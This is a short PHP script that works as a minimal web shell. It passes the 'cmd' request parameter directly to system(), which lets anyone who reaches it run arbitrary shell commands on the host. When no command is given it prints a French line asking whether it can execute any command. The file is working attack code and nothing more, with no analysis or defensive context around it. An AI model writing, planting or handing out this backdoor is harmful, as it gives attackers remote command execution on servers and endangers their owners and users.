<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "Je peux executer n'importe quel cmd?";
  }
?>
